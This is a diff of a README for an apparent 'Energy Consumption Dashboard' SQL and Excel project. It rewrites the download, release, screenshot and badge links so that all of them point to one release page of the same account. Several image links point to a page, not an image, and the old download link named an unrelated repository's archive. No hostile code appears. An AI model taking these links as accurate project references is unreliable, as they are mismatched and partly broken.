@@ -33,7 +33,7 @@ The main goal of this project is to provide a user-friendly interface to analyze
 ## How to Use 🚀
 
 To access the project, you can download the repository files from the following link:
-[Download Energy Consumption Dashboard Project](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[Download Energy Consumption Dashboard Project](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/tag/v1.0)
 
 🚨 **Note: Please ensure to check the "Releases" section if the above link is not working or if you need to access a specific version.**
 
@@ -49,9 +49,9 @@ To access the project, you can download the repository files from the following 
 
 Here are some sneak peeks of the Energy Consumption Dashboard project:
 
-![Energy Dashboard](https://example.com/energy_dashboard.png)
-![SQL Queries](https://example.com/sql_queries.png)
-![Power Pivot Model](https://example.com/power_pivot.png)
+![Energy Dashboard](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/tag/v1.0)
+![SQL Queries](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/tag/v1.0)
+![Power Pivot Model](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/tag/v1.0)
 
 ## Get Started 🚗
 
@@ -75,9 +75,9 @@ For any inquiries or assistance regarding the Energy Consumption Dashboard proje
 
 Let's make energy consumption analysis more insightful and engaging with this powerful dashboard project! 🌟
 
-🔗 **[Check Releases Section for More Versions](https://github.com/cli/browser/releases)**
+🔗 **[Check Releases Section for More Versions](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/tag/v1.0)**
 
-![Download Project](https://img.shields.io/badge/Download-Project-brightgreen)
+![Download Project](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/tag/v1.0)
 
 Here's to a brighter and more sustainable future powered by data-driven insights! 🌍⚡️
 
